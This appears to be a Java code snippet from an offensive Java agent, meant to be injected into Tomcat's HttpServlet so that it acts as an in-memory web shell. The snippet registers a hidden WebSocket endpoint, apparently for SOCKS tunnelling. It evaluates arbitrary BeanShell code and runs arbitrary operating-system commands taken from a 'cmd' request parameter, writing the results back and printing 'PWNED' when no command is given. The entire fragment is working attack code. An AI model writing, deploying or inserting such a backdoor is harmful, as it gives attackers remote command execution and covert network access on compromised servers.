PKG.servlet.http.HttpServlet __this = $0;
PKG.servlet.http.HttpServletRequest __req = $1;
PKG.servlet.http.HttpServletResponse __resp = $2;

if (!Agent.WS_REGISTERED) {
    Agent.WS_REGISTERED = true;

    org.apache.tomcat.websocket.server.WsServerContainer wc = (org.apache.tomcat.websocket.server.WsServerContainer)
        __this.getServletContext()
        .getAttribute("PKG.websocket.server.ServerContainer");

    Class clazz = DebugAgent.addAnnotation(pwn.websocket.Endpoint.class, "PKG", PKG.websocket.Endpoint.class);
    PKG.websocket.server.ServerEndpointConfig config = PKG.websocket.server.ServerEndpointConfig.Builder.create(
            clazz, Agent.SOCKS_URL).build();

    wc.addEndpoint(config);
}

if (__req.getRequestURI().contains(Agent.EVAL_URL)) {
    __resp.setStatus(200);

    java.lang.String cmd = __req.getParameter("cmd");
    if (cmd != null) {
        bsh.Interpreter interpreter = new bsh.Interpreter();
        String result =  interpreter.eval(cmd).toString();
        __resp.getOutputStream().write(result.getBytes("UTF-8"));
    } else {
        __resp.getOutputStream().print("PWNED");
    }
    return;
}


if (__req.getRequestURI().contains(Agent.SHELL_URL)) {
    __resp.setStatus(200);
    java.lang.String cmd = __req.getParameter("cmd");
    if (cmd != null) {
        // TODO: wrap command with the shell (both sh and cmd.exe)
        java.io.DataInputStream dis = new java.io.DataInputStream(
                java.lang.Runtime.getRuntime().exec(
                    cmd
                    ).getInputStream());
        int len;
        byte[] buf = new byte[1024];
        while((len=dis.read(buf))>0){
            __resp.getOutputStream().write(buf,0,len);
        }
    } else {
        __resp.getOutputStream().print("PWNED");
    }
    return;
}

